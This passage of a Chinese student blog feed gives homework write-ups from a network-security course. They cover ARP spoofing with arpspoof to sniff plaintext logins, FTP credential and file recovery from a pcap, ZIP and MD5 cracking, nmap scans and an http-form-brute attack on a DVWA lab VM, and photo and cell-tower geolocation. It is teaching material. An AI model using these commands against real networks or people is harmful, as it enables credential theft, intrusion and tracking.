&lt;h5 id=&#34;22-写出arpspoof命令格式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-写出arpspoof命令格式&#34;&gt;#&lt;/a&gt; 2.2 写出 arpspoof 命令格式。&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;arpspoof -i 网卡 -t 目标 ip 网关&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;23-在互联网上找到任意一个以明文方式传递用户帐号-密码的网站截图wireshark中显示的明文信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23-在互联网上找到任意一个以明文方式传递用户帐号-密码的网站截图wireshark中显示的明文信息&#34;&gt;#&lt;/a&gt; 2.3 在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，截图 Wireshark 中显示的明文信息。&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;17.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;18.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;密码是 base64 加密，相当于～&lt;s&gt; 无&lt;/s&gt;～&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;arp欺骗过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arp欺骗过程&#34;&gt;#&lt;/a&gt; arp 欺骗过程&lt;/h2&gt;
&lt;p&gt;环境：两台同网段的虚拟机 kali  &amp;amp;  unbuntu&lt;/p&gt;
&lt;p&gt;1. 启动 arpspoof 实施 arp 欺骗，让本机冒充网关收发数据&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; /proc/sys/net/ipv4/ip_forward&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;首先开启数据包转发&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;linux&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;11.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;131.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;2.wireshark 查看截获的数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;14.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;3. 过滤报文&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;15.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;16.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;=&lt;mark&gt; 看到用户在 http 下的明文数据&lt;/mark&gt; =&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;3ftp数据还原部分利用wireshark打开实验实验数据datapcapng&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3ftp数据还原部分利用wireshark打开实验实验数据datapcapng&#34;&gt;#&lt;/a&gt; 3.FTP 数据还原部分：利用 WireShark 打开实验实验数据 data.pcapng。&lt;/h2&gt;
&lt;h5 id=&#34;31-ftp服务器的ip地址是多少你是如何发现其为ftp服务器的&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#31-ftp服务器的ip地址是多少你是如何发现其为ftp服务器的&#34;&gt;#&lt;/a&gt; 3.1 FTP 服务器的 IP 地址是多少？你是如何发现其为 FTP 服务器的？&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;FTP 支持两种模式，一种方式叫做 Standard (也就是 PORT 方式，主动方式)，一种是 Passive (也就是 PASV，被动方式)。 Standard 模式 FTP 的客户端发送 PORT 命令到 FTP 服务器。Passive 模式 FTP 的客户端发送 PASV 命令到 FTP Server。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;1.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;FTP 服务器向用户询问密码，所以判断 192.168.182.1 是 FTP 服务器&lt;/mark&gt;&lt;/p&gt;
&lt;h5 id=&#34;32客户端登录ftp服务器的账号和密码分别是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#32客户端登录ftp服务器的账号和密码分别是什么&#34;&gt;#&lt;/a&gt; 3.2 客户端登录 FTP 服务器的账号和密码分别是什么？&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;2.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;可以看到有两次登录第一次失败了，第二次成功了&lt;/p&gt;
&lt;p&gt;账号：student  密码：sN46i5y&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&#34;33-客户端从ftp下载或查看了2个文件一个为zip文件一个为txt文件文件名分别是什么提示文件名有可能是中文&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#33-客户端从ftp下载或查看了2个文件一个为zip文件一个为txt文件文件名分别是什么提示文件名有可能是中文&#34;&gt;#&lt;/a&gt; 3.3 客户端从 FTP 下载或查看了 2 个文件，一个为 ZIP 文件，一个为 TXT 文件，文件名分别是什么？&lt;strong&gt;提示：文件名有可能是中文。&lt;/strong&gt;&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;压缩包：1.zip&lt;/p&gt;
&lt;p&gt;文件：复习题.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;3.png&#34; alt&gt;&lt;/p&gt;
&lt;h5 id=&#34;34-还原zip文件并打开zip有解压密码试图破解提示密码全为数字并为6位-截图破解过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#34-还原zip文件并打开zip有解压密码试图破解提示密码全为数字并为6位-截图破解过程&#34;&gt;#&lt;/a&gt; 3.4 还原 ZIP 文件并打开（ZIP 有解压密码，试图破解，提示：密码全为数字，并为 6 位）。截图破解过程。&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;4.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;文件传输层用的是 tcp 协议，ip 是 ftp 服务器&lt;/p&gt;
&lt;p&gt;之后再查找压缩文件头 HEX 504B&lt;/p&gt;
&lt;p&gt;可以看到 1.zip&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;5.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;追踪 tcp 数据流然后保存下来解压，发现有密码。&lt;/p&gt;
&lt;p&gt;尝试破解&lt;/p&gt;
&lt;p&gt;这里使用的是  ARCHPR&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;6.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;7.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;还好密码比较简单，之前暴力破解一个 zip 一个晚上都没出结果&lt;/p&gt;
&lt;p&gt;随缘😂&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;8.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;还原后的图片&lt;/p&gt;
&lt;p&gt;密码：123456&lt;/p&gt;
&lt;h5 id=&#34;35-txt文件的内容是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#35-txt文件的内容是什么&#34;&gt;#&lt;/a&gt; 3.5 TXT 文件的内容是什么？&lt;/h5&gt;
&lt;p&gt;&lt;img data-src=&#34;9.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;txt 文件没有 HEX 数据头，所以跟踪到文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;10.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;FTP DATA 中存有 txt 的原始数据&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;4-md5破解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-md5破解&#34;&gt;#&lt;/a&gt; 4、MD5 破解&lt;/h2&gt;
&lt;h5 id=&#34;sqlmap得到某数据库用户表信息用户口令的md5值为7282c5050cfe7df5e09a33ca456b94ae&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlmap得到某数据库用户表信息用户口令的md5值为7282c5050cfe7df5e09a33ca456b94ae&#34;&gt;#&lt;/a&gt; SqlMap 得到某数据库用户表信息，用户口令的 MD5 值为 7282C5050CFE7DF5E09A33CA456B94AE&lt;/h5&gt;
&lt;p&gt;那么，口令的明文是什么？（提示：MD5 值破解）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;明文：iampotato&lt;/p&gt;
&lt;p&gt;MD5 值目前的技术很难破解，一般采取 “碰撞” 的方式破解&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2Vjb25kLXRvbW9ycm93L3AvOTEyOTA0My5odG1s&#34;&gt;网页链接：MD5 是什么？&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;5-john-the-ripper的作用是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-john-the-ripper的作用是什么&#34;&gt;#&lt;/a&gt; 5、John the Ripper 的作用是什么？&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;John the Ripper 是一个暴力破解密码的软件&lt;/p&gt;
&lt;p&gt;采用的是字典爆破模式，可导入用户自己的字典&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NTRE4xODg3L2FydGljbGUvZGV0YWlscy84MTk3ODk5Nz91dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfcmVsZXZhbnRfdDAubm9uZS10YXNrLWJsb2ctQmxvZ0NvbW1lbmRGcm9tTWFjaGluZUxlYXJuUGFpMi0xLmNoYW5uZWxfcGFyYW0mYW1wO2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50X3QwLm5vbmUtdGFzay1ibG9nLUJsb2dDb21tZW5kRnJvbU1hY2hpbmVMZWFyblBhaTItMS5jaGFubmVsX3BhcmFt&#34;&gt;网页链接：密码破解利器 John the Rippe 使用详细&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;思考问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#思考问题&#34;&gt;#&lt;/a&gt; 思考问题：&lt;/h3&gt;
&lt;h5 id=&#34;1-谈谈如何防止arp攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-谈谈如何防止arp攻击&#34;&gt;#&lt;/a&gt; 1、谈谈如何防止 ARP 攻击。&lt;/h5&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l0eDIwMTQyMTQwODEvYXJ0aWNsZS9kZXRhaWxzLzgzMDI5NzYz&#34;&gt;arp 欺骗原理&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;静态网关地址&lt;/p&gt;
&lt;h5 id=&#34;2-安全的密码口令应遵循的原则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-安全的密码口令应遵循的原则&#34;&gt;#&lt;/a&gt; 2、安全的密码（口令）应遵循的原则。&lt;/h5&gt;
&lt;p&gt;比较冗长我总结一下&lt;/p&gt;
&lt;p&gt;1. 不使用弱密码&lt;/p&gt;
&lt;p&gt;2. 不重复使用密码&lt;/p&gt;
&lt;p&gt;3. 密码难度依据重要程度而定&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbWlzb2Z0LmNvbS9ibG9nLzEwMjgtbWltYWFucXVhbi0yLmh0bWw=&#34;&gt;安全密码三原则&lt;/span&gt;&lt;/p&gt;
&lt;h5 id=&#34;3-谈谈字典攻击中字典的重要性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-谈谈字典攻击中字典的重要性&#34;&gt;#&lt;/a&gt; 3、谈谈字典攻击中字典的重要性。&lt;/h5&gt;
&lt;p&gt;一个好的密码字典决定了破解的成功与否，好的密码字典要命中率高，所以最好的字典是根据个人的特性设计的，这样成功率会高一点。字典的重要性：&lt;mark&gt;字典中没有你要的密码的话都是白瞎！&lt;/mark&gt;&lt;/p&gt;
&lt;h5 id=&#34;4-实验小结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-实验小结&#34;&gt;#&lt;/a&gt; 4、实验小结。&lt;/h5&gt;
&lt;p&gt;本次试验我了解到了 arp 欺骗的原理，认识了 ftp 服务，知道了何为 MD5，但是都是简单的复现和认识。要灵活自如的上手还没有达到那个水平。在实验中 arpspoof 做 arp 欺骗成功了，网关和欺骗者 mac 地址相同，之后开启转发但是依旧失败。&lt;/p&gt;
&lt;p&gt;安全路上上道阻且长，加油吧骚年！&lt;/p&gt;
&lt;hr&gt;
</content>
        <category term="homework" scheme="https://sovegetable.github.io/tags/homework/" />
        <updated>2020-11-03T15:47:15.000Z</updated>
    </entry>
    <entry>
        <id>https://sovegetable.github.io/nettest/try1/</id>
        <title>网络渗透测试实验一</title>
        <link rel="alternate" href="https://sovegetable.github.io/nettest/try1/"/>
        <content type="html">&lt;div class=&#34;note default&#34;&gt;
&lt;p&gt;渗透测试实验一&lt;/p&gt;
&lt;/div&gt;
&lt;h2 id=&#34;1用搜索引擎google或百度搜索麻省理工学院网站中文件名包含network-security的pdf文档截图搜索得到的页面&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1用搜索引擎google或百度搜索麻省理工学院网站中文件名包含network-security的pdf文档截图搜索得到的页面&#34;&gt;#&lt;/a&gt; 1. 用搜索引擎 Google 或百度搜索麻省理工学院网站中文件名包含 “network security” 的 pdf 文档，截图搜索得到的页面&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;1.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;2.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../source/assets/20181004133738125&#34; alt=&#34;Google搜索语法&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;2照片中的女生在哪里旅行截图搜索到的地址信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2照片中的女生在哪里旅行截图搜索到的地址信息&#34;&gt;#&lt;/a&gt; 2. 照片中的女生在哪里旅行？截图搜索到的地址信息。&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;ns.jpg&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据图片上的信息可以确定咖啡馆的名称，通过 google 地图可以查到地址为 38 Avenue de Suffren, 75015 Paris&lt;/p&gt;
&lt;p&gt;虽然店铺装潢已经变了，但是还是可以通过图片中的披萨店和 2 楼窗台确定的&lt;img data-src=&#34;123.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;3-手机位置定位-通过l&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-手机位置定位-通过l&#34;&gt;#&lt;/a&gt; 3、手机位置定位。通过 L&lt;/h2&gt;
&lt;h2 id=&#34;aclocation-area-code位置区域码和cidcell-identity基站编号是个16位的数据范围是0到65535可以查询手机接入的基站的位置从而初步确定手机用户的位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#aclocation-area-code位置区域码和cidcell-identity基站编号是个16位的数据范围是0到65535可以查询手机接入的基站的位置从而初步确定手机用户的位置&#34;&gt;#&lt;/a&gt; AC（Location Area Code，位置区域码）和 CID（Cell Identity，基站编号，是个 16 位的数据（范围是 0 到 65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。&lt;/h2&gt;
&lt;p&gt;获取自己手机的 LAC 和 CID：&lt;/p&gt;
&lt;p&gt;Android 获取方法：Android： 拨号 *#&lt;em&gt;#4636#&lt;/em&gt;#* 进入手机信息工程模式后查看&lt;/p&gt;
&lt;p&gt;iphone 获取方法：iPhone：拨号 * 3001#12345#* 进入 FieldTest&lt;/p&gt;
&lt;p&gt;Serving Cell info–&amp;gt;LAC=Tracking Area Code --&amp;gt;cellid = Cell identity&lt;/p&gt;
&lt;p&gt;若不能获取，用右图信息。&lt;/p&gt;
&lt;p&gt;截图你查询到的位置信息。&lt;/p&gt;
&lt;ul class=&#34;task-list&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;
&lt;p&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_0&#34; disabled=&#34;true&#34;&gt;&lt;label for=&#34;cbx_0&#34;&gt; 我的手机是华为的，&lt;s&gt;禁用&lt;/s&gt;了该程序。&lt;/label&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;
&lt;p&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_1&#34; checked=&#34;true&#34; disabled=&#34;true&#34;&gt;&lt;label for=&#34;cbx_1&#34;&gt; 测试手机为小米&lt;/label&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;实验应用原理
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;sl.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;通过 LAC 反查可以获取到位置信息&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;wz.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;wz2.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;4-编码解码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-编码解码&#34;&gt;#&lt;/a&gt; 4、编码解码&lt;/h2&gt;
&lt;h2 id=&#34;将z29vzcbnb29kihn0dwr5iq解码-截图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#将z29vzcbnb29kihn0dwr5iq解码-截图&#34;&gt;#&lt;/a&gt; 将 Z29vZCBnb29kIHN0dWR5IQ== 解码。截图。&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;312.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;5-地址信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-地址信息&#34;&gt;#&lt;/a&gt; 5、地址信息&lt;/h2&gt;
&lt;h3 id=&#34;51内网中捕获到一个以太帧源mac地址为98-ca-33-02-27-b5目的ip地址为2021936434回答问题该用户使用的什么品牌的设备访问的是什么网站并附截图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#51内网中捕获到一个以太帧源mac地址为98-ca-33-02-27-b5目的ip地址为2021936434回答问题该用户使用的什么品牌的设备访问的是什么网站并附截图&#34;&gt;#&lt;/a&gt; 5.1 内网中捕获到一个以太帧，源 MAC 地址为：98-CA-33-02-27-B5；目的 IP 地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;134.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;133.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;52-访问httpswhatismyipaddresscom得到myip信息利用ipconfigwindows或ifconfiglinux查看本机ip地址两者值相同吗如果不相同的话说明原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#52-访问httpswhatismyipaddresscom得到myip信息利用ipconfigwindows或ifconfiglinux查看本机ip地址两者值相同吗如果不相同的话说明原因&#34;&gt;#&lt;/a&gt; 5.2 访问 https://whatismyipaddress.com 得到 MyIP 信息，利用 ipconfig (Windows) 或 ifconfig (Linux) 查看本机 IP 地址，两者值相同吗？如果不相同的话，说明原因。&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;不同，因为我们获取到的是公网地址，而ipconfig获取的是内网（相对于公网ip下）因为用了NAT地址转换技术
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h2 id=&#34;6-nmap使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6-nmap使用&#34;&gt;#&lt;/a&gt; 6、NMAP 使用&lt;/h2&gt;
&lt;h3 id=&#34;61利用nmap扫描metasploitable2需下载虚拟机镜像的端口开放情况-并附截图-说明其中四个端口的提供的服务查阅资料简要说明该服务的功能&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#61利用nmap扫描metasploitable2需下载虚拟机镜像的端口开放情况-并附截图-说明其中四个端口的提供的服务查阅资料简要说明该服务的功能&#34;&gt;#&lt;/a&gt; 6.1 利用 NMAP 扫描 Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。&lt;/h3&gt;
&lt;h3 id=&#34;62利用nmap扫描metasploitable2的操作系统类型并附截图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#62利用nmap扫描metasploitable2的操作系统类型并附截图&#34;&gt;#&lt;/a&gt; 6.2 利用 NMAP 扫描 Metasploitable2 的操作系统类型，并附截图。&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHh4eXovcC8xMTU2NzUzMS5odG1s&#34;&gt;网页链接：nmap 基本步骤&lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; nmap -sP 192.168.0.0/24 扫描存活
 nmap  192.168.xxx.xxx  发现存活主机后扫描端口
 namp -O 192.168.xxx.xxx  查看操作系统
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;fuwu.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;os.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;63-利用nmap穷举-metasploitable2上dvwa的登录账号和密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#63-利用nmap穷举-metasploitable2上dvwa的登录账号和密码&#34;&gt;#&lt;/a&gt; 6.3 利用 NMAP 穷举 Metasploitable2 上 dvwa 的登录账号和密码。&lt;/h3&gt;
&lt;p&gt;​		访问 ip 发现 80 有 http 服务发现了 dvwa 的登录界面&lt;/p&gt;
&lt;p&gt;​	&lt;img data-src=&#34;dvwa.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后使用 nmap 自带的爆破脚本进行弱口令爆破&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -p80 --script=http-form-brute --script-args=http-form-brute.path=/dvwa/login.php 192.168.37.189
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;bp.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;red&#34;&gt;Over！拿到登录账号和密码&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;64-查阅资料永恒之蓝-wannacry蠕虫利用漏洞的相关信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#64-查阅资料永恒之蓝-wannacry蠕虫利用漏洞的相关信息&#34;&gt;#&lt;/a&gt; 6.4 查阅资料，永恒之蓝 - WannaCry 蠕虫利用漏洞的相关信息。&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://www.sohu.com/a/395228053_115128&#34;&gt;&lt;em&gt;WannaCry&lt;/em&gt; 勒索病毒复现及分析，蠕虫&lt;em&gt;传播&lt;/em&gt;机制全网源码&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;WannaCry 勒索病毒主要行为是传播和勒索。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;传播：利用基于 445 端口的 SMB 漏洞 MS17-010 (永恒之蓝) 进行传播&lt;/li&gt;
&lt;li&gt;勒索：释放文件，包括加密器、解密器、说明文件、语言文件等；加密文件；设置桌面背景、窗体信息及付款账号等。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;7-利用zoomeye搜索一个西门子公司工控设备并描述其可能存在的安全问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7-利用zoomeye搜索一个西门子公司工控设备并描述其可能存在的安全问题&#34;&gt;#&lt;/a&gt; 7、利用 ZoomEye 搜索一个西门子公司工控设备，并描述其可能存在的安全问题&lt;/h2&gt;
&lt;p&gt;&lt;mark&gt;搜索 simens 发现有很多工控设备开启了 ssh 服务和 telnet 服务，若无管理则有被爆破的风险。&lt;/mark&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;8-winhex简单数据恢复与取证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8-winhex简单数据恢复与取证&#34;&gt;#&lt;/a&gt; 8、Winhex 简单数据恢复与取证&lt;/h2&gt;
&lt;h3 id=&#34;81-elephantjpg不能打开了利用winhex修复说明修复过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#81-elephantjpg不能打开了利用winhex修复说明修复过程&#34;&gt;#&lt;/a&gt; 8.1 elephant.jpg 不能打开了，利用 WinHex 修复，说明修复过程。&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW5nc2hhbmdiYXNoYW9uaWFuL2FydGljbGUvZGV0YWlscy84MDE1Njg2NQ==&#34;&gt;常见文件头汇总&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;jpg 的 hex 头尾 FFD8 修复一下就好&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;167.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;168.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复后文件：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;2.jpg&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;用 binwalk 二进制分析可以看到有两张图片（错乱）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;169.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;170.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;173.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;rainbow&#34;&gt;虽然两张图片一样大但是清晰度和大小比例均不如原图，可能是 ps 做出来的文件里面用的源文件吧.......&lt;/span&gt;😂&lt;/p&gt;
&lt;h3 id=&#34;82-笑脸背后的阴霾图片smile有什么隐藏信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#82-笑脸背后的阴霾图片smile有什么隐藏信息&#34;&gt;#&lt;/a&gt; 8.2 笑脸背后的阴霾：图片 smile 有什么隐藏信息。&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;166.png&#34; alt=&#34;avater&#34;&gt;&lt;/p&gt;
&lt;p&gt;Tom is the killer..         🔪&lt;/p&gt;
&lt;h3 id=&#34;83-尝试使用数据恢复软件恢复你的u盘中曾经删除的文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#83-尝试使用数据恢复软件恢复你的u盘中曾经删除的文件&#34;&gt;#&lt;/a&gt; 8.3 尝试使用数据恢复软件恢复你的 U 盘中曾经删除的文件。&lt;/h3&gt;
&lt;p&gt;以前使用过 easyrecovery 修复随身听的歌曲，不过只成功了一部分，有一些坏道还是不能修复。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC85NzU3MDcxMg==&#34;&gt;知乎：数据恢复原理&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
</content>
        <category term="homework" scheme="https://sovegetable.github.io/tags/homework/" />
        <updated>2020-10-30T15:22:00.000Z</updated>
    </entry>
    <entry>
        <id>https://sovegetable.github.io/Dedecms/</id>
        <title>Dedecms漏洞复现</title>
        <link rel="alternate" href="https://sovegetable.github.io/Dedecms/"/>
        <content type="html">&lt;h2 id=&#34;漏洞说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞说明&#34;&gt;#&lt;/a&gt; 漏洞说明：&lt;/h2&gt;
&lt;p&gt;2018 年 1 月 10 日， 锦行信息安全公众号公开了一个关于 DeDeCMS&lt;br&gt;
 前台任意用户密码修改漏洞的细节。&lt;br&gt;
2018 年 1 月 10 日，Seebug 漏洞平台收录该漏洞，漏洞编号为&lt;br&gt;
 SSV-97074，知道创宇 404 漏洞应急团队成功复现该漏洞。&lt;/p&gt;
&lt;p&gt;形成原因：&lt;/p&gt;
&lt;ol&gt;
